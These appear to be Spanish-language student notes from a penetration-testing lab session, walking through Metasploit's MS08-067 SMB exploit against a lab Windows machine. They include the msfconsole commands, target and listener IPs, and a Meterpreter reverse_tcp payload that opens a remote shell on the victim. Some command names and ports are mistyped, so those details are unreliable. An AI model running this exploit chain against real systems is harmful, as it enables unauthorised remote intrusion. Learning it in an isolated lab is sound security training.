El Core de Nexus es bastante bueno pero 

ENtonces de la sesión pasada

Se llama exploit porque explota una mala implementación.


Entonces vamos a explorar:

`cd usr/share/metasploit-framework`

Acá pues los verdecitos son binarios, tiene una API abierta con el `msfd` (daemon)


Entonces hacemos `sudo msfdb init` entonces iniciamos los indices de las bases de datos, lo azulito está en directorios, en posts hay recientes, en nops son tecnicas de evasio´n.

Pero si accede a `modules/exploits/windows` entonces de lo que habíamos descubierto antes es que el SMB nos había servido y, si miramos las opciones que tenemos justamente está el SMB.

Entonces al acceder a los `/smb` y hace `la|more` y encuentra que hay uno que coincide con el 08_067 de la sesión pasada

entonces si abre uno hace `vi smb_08_068_metaapi.rb` o algo así y entonce le sale .

Entonces la dirección de retorno es ese número y la scratch es a dónde lo va a  mandar, el payload, si es un SP (Service Pack) según la versión va cambiando


Entonces lo primero fue `sudo msfdb init` porque eso está en un repo postgresql

Entonces `sudo service postgresql start` y así se inicializa, si mira `ps -ef|grep postgre`

Ebtonces `sudo msfconsole`

Entonces seleccionamos el exploit que medio identificamos, entonces hacemos
`uso exploit/` porque auxiliamos otras tecnicas de evasión desde allí, continuamos con `use exploit/windows/smb/ms08_067_netapi` o [TAB] en un punto y si miraos entonces hacemos:

`show options` y con esto tenemos las opciones para parametrizar un exploit, como este se aprovecha de un fallo remoto del servicio SMB por el puerto 445, entonces acá tiene unos parámetros, en otro pues tendrá otros, podemos preguntar a la IA para saber parametrizar, pero también podemos buscar la documentación de rapid7 (sitio oficial) y buscamos el exploit. En el canal de securityTube podemos aprender!

Entonces los parametros dicen:
- RHOST: 
  
Entonces ponemos `set rhost 192.168.116.130` 
Hacemos `show options` y vemos que quedó seteado el host remoto (verificamos conectividad capa 3 si no pues no hacemos nada y nos responde el ping `ping 192.168.116.130`) en esta versión nos pone el LHOST, que somos nosotros (192.168.116.128) pero si no está se pone, pero el chiste es que uno es ayudado por la comunidad.
Hacemos un `show payloads` y hay un montón, los "VNC" es que si ejecutan satisfactoriamente pueden traer la interfaz a travez de un "Virtual Remote Console"

Entonces hacemos un `set payload windows/meterpreter/reverse_tcp` este reverse lo que hace es una conexión inversa que utiliza otros puertos, hace una conexión inversa entre cliente y atacante, digamos entre el 444 y 445, el atacante es el cliente, el cliente la víctima.

Entonces dejó más cosas como el EXITFUNC en modo HILO, LHOST soy yo, el LPORT es 4444 para hacer el reverso con la víctima y ser como escucha como atacante y dejar el paso de mensaje. El automatica Targeting en 0, porque hace detección automática.


Entonces le lanzamos la metralleta con `exploit` o `run`, y empieza, intenta un handler del 444 al 445 y dice la maquinita de la persona, que seleccionó el service pack en ingles y luego dice que abrió una sesión de meterpreter desde el :4444 hasta la máquina :1045 que es un puerto que abrió en la víctima, si pone `help` muestra comandos para mirar qué puede hacer

entonces por ejemplo en el meterpreter hacemos una `shell` y con ello nos mostrará las especificaciones de la maquinita

Entonces hacemos un `cd \` para ir a la raiz, y si puede hacer un `mkdir HACK4March2025` y si puede crearla pues eso, literalmente todo access

Entonces por ejemplo desde el msf6 exploit puede configurarse para que cambiando el payload pues le abra de una la shell.


Otros comandos por ejemplo para mirar desde el kali son `ls la|grep smb`


Como punto cero entregar lo que hicimos con el CVS Calculator

VIsitar el sitio de `https://docs.metasploit.com/`